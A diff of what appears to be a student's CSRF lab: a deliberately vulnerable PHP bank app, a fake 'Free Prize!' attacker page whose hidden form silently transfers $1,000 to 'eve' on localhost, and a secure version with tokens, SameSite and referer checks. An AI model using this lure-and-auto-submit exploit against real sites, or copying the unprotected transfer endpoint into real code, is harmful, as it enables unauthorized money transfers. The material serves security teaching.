@@ -18,9 +18,9 @@ csrf_demo/
  VULNERABLE VERSION - Files 1-6
 ================================================================================
 
---------------------------------------------------------------------------------
+================================================================================
 FILE 1: vulnerable/init_db.php
---------------------------------------------------------------------------------
+================================================================================
 <?php
 // Database initialization for vulnerable banking site
 
@@ -28,7 +28,7 @@ try {
     $db = new PDO('sqlite:bank_vulnerable.db');
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
     
-    // Create users table
+    // Create users table with names and password for login access, then balance
     $db->exec("
         CREATE TABLE IF NOT EXISTS users (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -38,7 +38,7 @@ try {
         )
     ");
     
-    // Create transactions table
+    // Create transactions table for convo
     $db->exec("
         CREATE TABLE IF NOT EXISTS transactions (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -49,7 +49,7 @@ try {
         )
     ");
     
-    // Clear existing data
+    // Clear existing data like users and transactions
     $db->exec("DELETE FROM users");
     $db->exec("DELETE FROM transactions");
     
@@ -76,13 +76,12 @@ try {
 }
 ?>
 
---------------------------------------------------------------------------------
+================================================================================
 FILE 2: vulnerable/index.php
---------------------------------------------------------------------------------
+================================================================================
 <?php
 session_start();
 
-// Redirect if already logged in
 if (isset($_SESSION['user'])) {
     header('Location: dashboard.php');
     exit;
@@ -121,7 +120,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <body>
     <div class="container">
         <h1>🏦 Vulnerable Bank Login</h1>
-        <div class="warning">⚠️ NO CSRF PROTECTION</div>
+        <div class="warning"> NO CSRF PROTECTION</div>
         
         <?php if ($error): ?>
             <div class="error"><?= htmlspecialchars($error) ?></div>
@@ -142,9 +141,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 </body>
 </html>
 
---------------------------------------------------------------------------------
+================================================================================
 FILE 3: vulnerable/dashboard.php
---------------------------------------------------------------------------------
+================================================================================
 <?php
 session_start();
 
@@ -158,12 +157,10 @@ $username = $_SESSION['user'];
 try {
     $db = new PDO('sqlite:bank_vulnerable.db');
     
-    // Get current balance
     $stmt = $db->prepare("SELECT balance FROM users WHERE username = ?");
     $stmt->execute([$username]);
     $balance = $stmt->fetchColumn();
     
-    // Get recent transactions
     $stmt = $db->prepare("
         SELECT * FROM transactions 
         WHERE sender = ? OR recipient = ? 
@@ -184,10 +181,10 @@ try {
 </head>
 <body>
     <div class="container">
-        <h1>🏦 Welcome, <?= htmlspecialchars($username) ?></h1>
+        <h1>Welcome, <?= htmlspecialchars($username) ?></h1>
         <div class="balance">Current Balance: $<?= number_format($balance, 2) ?></div>
         
-        <div class="warning">⚠️ VULNERABLE: No CSRF protection on transfer form!</div>
+        <div class="warning"> VULNERABLE: No CSRF protection on transfer form!</div>
         
         <h2>Transfer Money</h2>
         <form method="POST" action="transfer.php">
@@ -227,18 +224,15 @@ try {
 </body>
 </html>
 
---------------------------------------------------------------------------------
-FILE 4: vulnerable/transfer.php (⚠️ VULNERABLE!)
---------------------------------------------------------------------------------
+================================================================================
+FILE 4: vulnerable/transfer.php ( VULNERABLE!)
+================================================================================
 <?php
 session_start();
 
 if (!isset($_SESSION['user'])) {
     die('Not logged in');
 }
-
-// ⚠️ VULNERABLE: NO CSRF TOKEN VALIDATION!
-// This endpoint accepts ANY POST request with valid session
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $sender = $_SESSION['user'];
@@ -253,7 +247,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $db = new PDO('sqlite:bank_vulnerable.db');
         $db->beginTransaction();
         
-        // Check sender balance
         $stmt = $db->prepare("SELECT balance FROM users WHERE username = ?");
         $stmt->execute([$sender]);
         $sender_balance = $stmt->fetchColumn();
@@ -262,15 +255,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             die('Insufficient funds');
         }
         
-        // Deduct from sender
         $stmt = $db->prepare("UPDATE users SET balance = balance - ? WHERE username = ?");
         $stmt->execute([$amount, $sender]);
         
-        // Add to recipient
         $stmt = $db->prepare("UPDATE users SET balance = balance + ? WHERE username = ?");
         $stmt->execute([$amount, $recipient]);
         
-        // Log transaction
         $stmt = $db->prepare("
             INSERT INTO transactions (sender, recipient, amount) VALUES (?, ?, ?)
         ");
@@ -278,7 +268,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         
         $db->commit();
         
-        // Success - redirect back
         header('Location: dashboard.php');
         exit;
         
@@ -289,9 +278,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 }
 ?>
 
---------------------------------------------------------------------------------
+================================================================================
 FILE 5: vulnerable/logout.php
---------------------------------------------------------------------------------
+================================================================================
 <?php
 session_start();
 session_destroy();
@@ -299,255 +288,42 @@ header('Location: index.php');
 exit;
 ?>
 
---------------------------------------------------------------------------------
+================================================================================
 FILE 6: vulnerable/styles.css
---------------------------------------------------------------------------------
-body {
-    font-family: Arial, sans-serif;
-    background: #f0f2f5;
-    padding: 20px;
-}
-
-.container {
-    max-width: 600px;
-    margin: 0 auto;
-    background: white;
-    padding: 30px;
-    border-radius: 10px;
-    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-}
-
-h1 { color: #333; text-align: center; margin-bottom: 20px; }
-h2 { color: #555; border-bottom: 2px solid #ddd; padding-bottom: 10px; margin-top: 30px; }
-
-.balance {
-    background: #4CAF50;
-    color: white;
-    padding: 20px;
-    text-align: center;
-    font-size: 24px;
-    border-radius: 8px;
-    margin: 20px 0;
-}
-
-.warning {
-    background: #ff5722;
-    color: white;
-    padding: 15px;
-    text-align: center;
-    border-radius: 5px;
-    margin: 20px 0;
-    font-weight: bold;
-}
-
-.success {
-    background: #4CAF50;
-    color: white;
-    padding: 15px;
-    text-align: center;
-    border-radius: 5px;
-    margin: 20px 0;
-    font-weight: bold;
-}
-
-.error {
-    background: #f44336;
-    color: white;
-    padding: 10px;
-    border-radius: 5px;
-    margin: 10px 0;
-}
-
-form {
-    margin: 20px 0;
-}
-
-label {
-    display: block;
-    margin: 10px 0 5px;
-    font-weight: bold;
-}
-
-input, select {
-    width: 100%;
-    padding: 10px;
-    border: 1px solid #ddd;
-    border-radius: 5px;
-    box-sizing: border-box;
-}
-
-button {
-    width: 100%;
-    padding: 12px;
-    background: #2196F3;
-    color: white;
-    border: none;
-    border-radius: 5px;
-    font-size: 16px;
-    cursor: pointer;
-    margin-top: 10px;
-}
-
-button:hover { background: #0b7dda; }
-
-table {
-    width: 100%;
-    border-collapse: collapse;
-    margin-top: 20px;
-}
-
-table th {
-    background: #2196F3;
-    color: white;
-    padding: 10px;
-    text-align: left;
-}
-
-table td {
-    padding: 10px;
-    border-bottom: 1px solid #ddd;
-}
-
-table tr:hover { background: #f5f5f5; }
-
-.hint { text-align: center; color: #666; font-size: 14px; margin-top: 10px; }
-
-.logout {
-    display: inline-block;
-    margin-top: 20px;
-    padding: 10px 20px;
-    background: #f44336;
-    color: white;
-    text-decoration: none;
-    border-radius: 5px;
-}
-
-.logout:hover { background: #da190b; }
+================================================================================
+body { font-family: Arial, sans-serif; background: #f0f2f5; padding: 20px; }
+.container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; }
+h1 { color: #333; text-align: center; }
+.balance { background: #4CAF50; color: white; padding: 20px; text-align: center; font-size: 24px; }
+.warning { background: #ff5722; color: white; padding: 15px; text-align: center; font-weight: bold; }
+.success { background: #4CAF50; color: white; padding: 15px; text-align: center; font-weight: bold; }
+.error { background: #f44336; color: white; padding: 10px; }
+input, select { width: 100%; padding: 10px; border: 1px solid #ddd; }
+button { width: 100%; padding: 12px; background: #2196F3; color: white; border: none; cursor: pointer; }
+table { width: 100%; border-collapse: collapse; }
 
 ================================================================================
  ATTACKER VERSION - File 7
 ================================================================================
 
---------------------------------------------------------------------------------
-FILE 7: attacker/malicious.html (CSRF EXPLOIT - WITH DROPDOWN SELECTOR)
---------------------------------------------------------------------------------
+================================================================================
+FILE 7: attacker/malicious.html (CSRF EXPLOIT)
+================================================================================
 <!DOCTYPE html>
 <html>
 <head>
     <title>Free Prize!</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .prize-box {
-            background: white;
-            color: #333;
-            padding: 40px;
-            border-radius: 20px;
-            max-width: 600px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-        }
-        h1 { 
-            color: #667eea; 
-            font-size: 48px; 
-            margin-bottom: 20px;
-            animation: bounce 2s infinite;
-        }
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-        p {
-            font-size: 18px;
-            line-height: 1.6;
-            margin: 20px 0;
-        }
-        .target-selector {
-            background: #f5f5f5;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-            border: 2px solid #ddd;
-        }
-        .target-selector label {
-            display: block;
-            font-weight: bold;
-            margin-bottom: 10px;
-            color: #333;
-            font-size: 16px;
-        }
-        .target-selector select {
-            width: 100%;
-            padding: 12px;
-            font-size: 16px;
-            border: 2px solid #667eea;
-            border-radius: 8px;
-            background: white;
-            cursor: pointer;
-            color: #333;
-        }
-        .target-selector select:focus {
-            outline: none;
-            border-color: #764ba2;
-            box-shadow: 0 0 10px rgba(102,126,234,0.3);
-        }
-        .target-info {
-            margin-top: 15px;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: bold;
-        }
-        .target-vulnerable {
-            background: #ffebee;
-            color: #c62828;
-            border: 2px solid #ef5350;
-        }
-        .target-secure {
-            background: #e8f5e9;
-            color: #2e7d32;
-            border: 2px solid #66bb6a;
-        }
-        button {
-            background: #667eea;
-            color: white;
-            border: none;
-            padding: 20px 50px;
-            font-size: 24px;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 5px 15px rgba(102,126,234,0.4);
-            margin-top: 20px;
-        }
-        button:hover {
-            background: #764ba2;
-            transform: scale(1.05);
-            box-shadow: 0 8px 25px rgba(118,75,162,0.6);
-        }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
+        .prize-box { background: white; color: #333; padding: 40px; border-radius: 20px; max-width: 600px; }
+        h1 { color: #667eea; font-size: 48px; }
+        p { font-size: 18px; margin: 20px 0; }
+        .target-selector { background: #f5f5f5; padding: 20px; border-radius: 10px; margin: 20px 0; }
+        .target-selector select { width: 100%; padding: 12px; font-size: 16px; border: 2px solid #667eea; }
+        .target-vulnerable { background: #ffebee; color: #c62828; padding: 12px; }
+        .target-secure { background: #e8f5e9; color: #2e7d32; padding: 12px; }
+        button { background: #667eea; color: white; border: none; padding: 20px 50px; font-size: 24px; cursor: pointer; }
         .hidden { display: none; }
-        .disclaimer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #999;
-        }
-        .instructions {
-            background: #fff3cd;
-            color: #856404;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            border: 2px solid #ffc107;
-        }
     </style>
 </head>
 <body>
@@ -561,12 +337,10 @@ FILE 7: attacker/malicious.html (CSRF EXPLOIT - WITH DROPDOWN SELECTOR)
             exclusive promotion!
         </p>
         
-        <!-- TESTING INSTRUCTIONS FOR EXAMINER -->
         <div class="instructions">
             <strong>[For Examiner]:</strong> Select target bank below, login to that bank in another tab, then click the prize button.
         </div>
         
-        <!-- TARGET SELECTION DROPDOWN -->
         <div class="target-selector">
             <label for="target-select">[Select Attack Target]</label>
             <select id="target-select" onchange="updateTarget()">
@@ -583,7 +357,6 @@ FILE 7: attacker/malicious.html (CSRF EXPLOIT - WITH DROPDOWN SELECTOR)
         </p>
         <button onclick="claimPrize()">Claim Your Prize!</button>
         
-        <!-- HIDDEN CSRF ATTACK FORM (dynamically updated by JavaScript) -->
         <form id="csrf-attack" class="hidden" method="POST" 
               action="http://localhost:8000/transfer.php">
             <input type="hidden" name="recipient" value="eve">
@@ -597,7 +370,14 @@ FILE 7: attacker/malicious.html (CSRF EXPLOIT - WITH DROPDOWN SELECTOR)
     </div>
     
     <script>
-        // Update target based on dropdown selection
+        console.log('%c[ATTACKER SITE] Cookie Analysis', 'color: red; font-size: 16px; font-weight: bold');
+        console.log('Current Domain:', window.location.hostname);
+        console.log('Current Port:', window.location.port);
+        console.log('Cookies visible to this page:', document.cookie || '(none)');
+        console.log('%cNOTE: HttpOnly cookies are NOT visible to JavaScript!', 'color: orange; font-weight: bold');
+        console.log('%cBut browser WILL send them automatically with form submission!', 'color: orange; font-weight: bold');
+        console.log('='.repeat(70));
+        
         function updateTarget() {
             const select = document.getElementById('target-select');
             const port = select.value;
@@ -605,10 +385,13 @@ FILE 7: attacker/malicious.html (CSRF EXPLOIT - WITH DROPDOWN SELECTOR)
             const infoDiv = document.getElementById('target-info');
             const currentTarget = document.getElementById('current-target');
             
-            // Update form action dynamically
             form.action = `http://localhost:${port}/transfer.php`;
             
-            // Update UI feedback
+            console.log(`%c[TARGET CHANGE] Port ${port}`, 'color: blue; font-weight: bold');
+            console.log(`   Form will submit to: ${form.action}`);
+            console.log(`   Bank type: ${port === '8000' ? 'VULNERABLE' : 'SECURE'}`);
+            console.log('='.repeat(70));
+            
             if (port === '8000') {
                 infoDiv.className = 'target-info target-vulnerable';
                 infoDiv.innerHTML = '[WARNING] Attacking VULNERABLE bank - Attack should SUCCEED';
@@ -624,16 +407,67 @@ FILE 7: attacker/malicious.html (CSRF EXPLOIT - WITH DROPDOWN SELECTOR)
             const port = document.getElementById('target-select').value;
             const bankType = port === '8000' ? 'VULNERABLE' : 'SECURE';
             
-            alert(`Processing your prize...\n\nPlease wait while we verify your account.\n\n[Hidden: Attacking ${bankType} bank on port ${port}]`);
+            console.log('%c[CSRF ATTACK INITIATED]', 'color: red; font-size: 18px; font-weight: bold; background: yellow');
+            console.log('='.repeat(70));
+            console.log('[Attack Details]');
+            console.log('   Target Bank:', bankType);
+            console.log('   Target URL:', `http://localhost:${port}/transfer.php`);
+            console.log('   Recipient:', 'eve');
+            console.log('   Amount:', '$1,000');
+            console.log('='.repeat(70));
             
-            // CSRF ATTACK MECHANISM:
-            // Form submits to selected port (8000 or 8001)
-            // Browser automatically includes victim's session cookie for that port
-            // Port 8000: NO CSRF validation → Attack succeeds
-            // Port 8001: CSRF token validation → Attack blocked
+            console.log('[Cookies visible to attacker (JavaScript)]');
+            if (document.cookie) {
+                const cookies = document.cookie.split(';').map(c => c.trim());
+                cookies.forEach(cookie => {
+                    console.log(`   ${cookie}`);
+                });
+            } else {
+                console.log('   (none - all cookies are HttpOnly or no cookies set)');
+            }
+            console.log('='.repeat(70));
+            
+            console.log('%c[CRITICAL] Browser\'s Automatic Behavior', 'color: orange; font-weight: bold; font-size: 14px');
+            console.log('    Browser will automatically send ALL cookies for localhost:' + port);
+            console.log('    This includes HttpOnly session cookies (PHPSESSID)');
+            console.log('    JavaScript cannot see HttpOnly cookies, but browser sends them!');
+            console.log('    This is how CSRF attacks work - cookie reuse across origins');
+            console.log('='.repeat(70));
+            
+            console.log('%c[Submitting hidden form...]', 'color: blue; font-weight: bold');
+            console.log('   Method: POST');
+            console.log('   Action:', `http://localhost:${port}/transfer.php`);
+            console.log('   Form data: recipient=eve, amount=1000');
+            console.log('='.repeat(70));
+            
+            if (port === '8000') {
+                console.log('%c[VULNERABLE VERSION] Expected Result:', 'color: red; font-weight: bold');
+                console.log('   - No CSRF token validation');
+                console.log('   - Attack will SUCCEED');
+                console.log('   - Money will be transferred');
+            } else {
+                console.log('%c[SECURE VERSION] Expected Result:', 'color: green; font-weight: bold');
+                console.log('   + CSRF token validation enabled');
+                console.log('   + Attack will be BLOCKED');
+                console.log('   + Transfer rejected (no valid token)');
+            }
+            console.log('='.repeat(70));
+            
+            alert(`Processing your prize...\n\nPlease wait while we verify your account.\n\n[Hidden: Attacking ${bankType} bank on port ${port}]\n\n>> CHECK BROWSER CONSOLE (F12) FOR DETAILED LOGS!`);
             
             document.getElementById('csrf-attack').submit();
         }
+        
+        window.addEventListener('load', function() {
+            console.log('%c[SUCCESS] Attacker page loaded successfully', 'color: green; font-weight: bold');
+            console.log('>> Open browser DevTools (F12) to see all cookie and attack details');
+            console.log('[Instructions]');
+            console.log('   1. Select target bank from dropdown');
+            console.log('   2. Login to that bank in another tab');
+            console.log('   3. Return here and click "Claim Your Prize"');
+            console.log('   4. Watch console logs during attack');
+            console.log('='.repeat(70));
+        });
     </script>
 </body>
 </html>
@@ -642,9 +476,9 @@ FILE 7: attacker/malicious.html (CSRF EXPLOIT - WITH DROPDOWN SELECTOR)
  SECURE VERSION - Files 8-13 (WITH CSRF PROTECTION)
 ================================================================================
 
---------------------------------------------------------------------------------
+================================================================================
 FILE 8: secure/init_db.php
---------------------------------------------------------------------------------
+================================================================================
 <?php
 // Database initialization for SECURE banking site
 // (Same as vulnerable but different database name)
@@ -697,20 +531,19 @@ try {
 }
 ?>
 
---------------------------------------------------------------------------------
+================================================================================
 FILE 9: secure/index.php
---------------------------------------------------------------------------------
+================================================================================
 <?php
 session_start();
 
-// ✅ COUNTERMEASURE 1: SameSite Cookie Attribute
 session_set_cookie_params([
     'lifetime' => 3600,
     'path' => '/',
     'domain' => 'localhost',
-    'secure' => false,     // Set true in production with HTTPS
-    'httponly' => true,    // Prevent JavaScript access
-    'samesite' => 'Lax'    // Block cross-site cookie transmission
+    'secure' => false,
+    'httponly' => true,
+    'samesite' => 'Lax'
 ]);
 
 if (isset($_SESSION['user'])) {
@@ -732,7 +565,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         
         if ($user) {
             $_SESSION['user'] = $username;
-            // ✅ COUNTERMEASURE 2: Generate CSRF token on login
             $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
             header('Location: dashboard.php');
             exit;
@@ -752,8 +584,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 </head>
 <body>
     <div class="container">
-        <h1>🔒 Secure Bank Login</h1>
-        <div class="success">✅ CSRF PROTECTION ENABLED</div>
+        <h1> Secure Bank Login</h1>
+        <div class="success"> CSRF PROTECTION ENABLED</div>
         
         <?php if ($error): ?>
             <div class="error"><?= htmlspecialchars($error) ?></div>
@@ -774,9 +606,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 </body>
 </html>
 
---------------------------------------------------------------------------------
+================================================================================
 FILE 10: secure/dashboard.php
---------------------------------------------------------------------------------
+================================================================================
 <?php
 session_start();
 
@@ -785,7 +617,6 @@ if (!isset($_SESSION['user'])) {
     exit;
 }
 
-// ✅ COUNTERMEASURE 3: Generate CSRF token if not exists
 if (!isset($_SESSION['csrf_token'])) {
     $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
 }
@@ -819,14 +650,13 @@ try {
 </head>
 <body>
     <div class="container">
-        <h1>🔒 Welcome, <?= htmlspecialchars($username) ?></h1>
+        <h1>Welcome, <?= htmlspecialchars($username) ?></h1>
         <div class="balance">Current Balance: $<?= number_format($balance, 2) ?></div>
         
-        <div class="success">✅ PROTECTED: CSRF tokens enabled!</div>
+        <div class="success"> PROTECTED: CSRF tokens enabled!</div>
         
         <h2>Transfer Money</h2>
         <form method="POST" action="transfer.php">
-            <!-- ✅ CSRF Token Hidden Field -->
             <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
             
             <label>Recipient:</label>
@@ -865,9 +695,9 @@ try {
 </body>
 </html>
 
---------------------------------------------------------------------------------
-FILE 11: secure/transfer.php (✅ PROTECTED!)
---------------------------------------------------------------------------------
+================================================================================
+FILE 11: secure/transfer.php ( PROTECTED!)
+================================================================================
 <?php
 session_start();
 
@@ -876,15 +706,13 @@ if (!isset($_SESSION['user'])) {
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // ✅ COUNTERMEASURE 4: CSRF Token Validation
     if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
-        die('⛔ CSRF token validation failed! Attack blocked.');
+        die(' CSRF token validation failed! Attack blocked.');
     }
     
-    // ✅ COUNTERMEASURE 5: Referer Header Validation (fallback)
     $referer = $_SERVER['HTTP_REFERER'] ?? '';
     if (strpos($referer, 'http://localhost:8001') !== 0) {
-        die('⛔ Invalid referer! Request must originate from same domain.');
+        die(' Invalid referer! Request must originate from same domain.');
     }
     
     $sender = $_SESSION['user'];
@@ -918,7 +746,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         
         $db->commit();
         
-        // ✅ COUNTERMEASURE 6: Regenerate CSRF token after use
         $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
         
         header('Location: dashboard.php');
@@ -931,9 +758,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 }
 ?>
 
---------------------------------------------------------------------------------
+================================================================================
 FILE 12: secure/logout.php
---------------------------------------------------------------------------------
+================================================================================
 <?php
 session_start();
 session_destroy();
@@ -941,63 +768,49 @@ header('Location: index.php');
 exit;
 ?>
 
---------------------------------------------------------------------------------
-FILE 13: secure/styles.css (Same as vulnerable/styles.css)
---------------------------------------------------------------------------------
-(Copy content from vulnerable/styles.css above)
+================================================================================
+FILE 13: secure/styles.css
+================================================================================
+body { font-family: Arial, sans-serif; background: #f0f2f5; padding: 20px; }
+.container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; }
+h1 { color: #333; text-align: center; }
+.balance { background: #4CAF50; color: white; padding: 20px; text-align: center; font-size: 24px; }
+.warning { background: #ff5722; color: white; padding: 15px; text-align: center; font-weight: bold; }
+.success { background: #4CAF50; color: white; padding: 15px; text-align: center; font-weight: bold; }
+.error { background: #f44336; color: white; padding: 10px; }
+input, select { width: 100%; padding: 10px; border: 1px solid #ddd; }
+button { width: 100%; padding: 12px; background: #2196F3; color: white; border: none; cursor: pointer; }
+table { width: 100%; border-collapse: collapse; }
 
 ================================================================================
- COUNTERMEASURES SUMMARY (Question 4.2b - 5 Marks)
+ COUNTERMEASURES SUMMARY
 ================================================================================
 
-COUNTERMEASURE 1: Synchronizer Token Pattern (CSRF Tokens)
------------------------------------------------------------
-Implementation:
-- Generate unique random token on login: bin2hex(random_bytes(32))
-- Store in $_SESSION['csrf_token']
-- Embed in forms as hidden field
-- Validate on submission: $_POST['csrf_token'] === $_SESSION['csrf_token']
-- Regenerate after successful use
+IMPLEMENTED CSRF PROTECTIONS (in secure/ version):
 
-Effectiveness: ⭐⭐⭐⭐⭐ (Primary defense)
-Location: secure/index.php (line 28), dashboard.php (line 64), transfer.php (line 12)
+1. Synchronizer Token Pattern (CSRF Tokens)
+   - Generated on login: bin2hex(random_bytes(32))
+   - Embedded in forms as hidden field
+   - Validated on transfer.php submission
+   - Regenerated after each use
 
-COUNTERMEASURE 2: SameSite Cookie Attribute
---------------------------------------------
-Implementation:
-session_set_cookie_params([
-    'samesite' => 'Lax'  // Blocks cross-site cookie transmission
-]);
+2. SameSite Cookie Attribute
+   - session_set_cookie_params(['samesite' => 'Lax'])
+   - Blocks cross-site cookie transmission
+   - Modern browser defense
 
-Effectiveness: ⭐⭐⭐⭐⭐ (Modern browser defense)
-Location: secure/index.php (line 4-10)
-How it works: Browser refuses to send cookie with cross-site POST requests
+3. Referer Header Validation
+   - Checks HTTP_REFERER header
+   - Ensures request originates from same domain
+   - Fallback defense (can be stripped by proxies)
 
-COUNTERMEASURE 3: Referer Header Validation
---------------------------------------------
-Implementation:
-$referer = $_SERVER['HTTP_REFERER'] ?? '';
-if (strpos($referer, 'http://localhost:8001') !== 0) {
-    die('Invalid referer!');
-}
+4. HttpOnly Cookie Flag
+   - Prevents JavaScript access to session cookie
+   - Mitigates XSS-based session theft
 
-Effectiveness: ⭐⭐⭐ (Fallback - can be stripped by proxies)
-Location: secure/transfer.php (line 17-20)
-
-COUNTERMEASURE 4: Token Regeneration
--------------------------------------
-Implementation:
-$_SESSION['csrf_token'] = bin2hex(random_bytes(32));  // After each use
-
-Effectiveness: ⭐⭐⭐⭐ (Prevents token reuse)
-Location: secure/transfer.php (line 49)
-
-ADDITIONAL SECURITY MEASURES:
------------------------------
-- HttpOnly flag: Prevents JavaScript access to session cookie
-- Prepared statements: Prevents SQL injection
-- Transaction rollback: Ensures data consistency
-- Input validation: Checks recipient and amount
+5. Token Regeneration
+   - New token generated after each transfer
+   - Prevents token reuse attacks
 
 ================================================================================
  END OF CODE
